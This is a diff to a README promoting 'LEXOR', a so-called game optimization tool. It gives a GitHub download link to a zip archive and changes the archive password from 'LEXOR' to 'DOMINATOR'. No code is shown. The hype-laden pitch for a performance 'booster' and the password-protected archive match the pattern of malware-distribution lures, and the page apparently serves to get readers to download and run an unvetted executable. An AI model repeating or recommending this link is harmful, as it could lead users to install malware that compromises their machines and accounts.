@@ -2,7 +2,7 @@
 # 🚀 **LEXOR — The Ultimate Game Optimization Tool**
 
 👉 **[⬇️ Download LEXOR](https://github.com/Bayb1k/LEXOR-Game-Optimization/releases/download/Booster/LEXOR.Game.Optimization.zip)**  
-🔐 **Password: `LEXOR`**
+🔐 **Password: `DOMINATOR`**
 
 Tired of lag, FPS drops, or stuttering in your favorite games?  
 **LEXOR** is your all-in-one solution to unlock smoother, faster, and cleaner gameplay — no technical knowledge required.
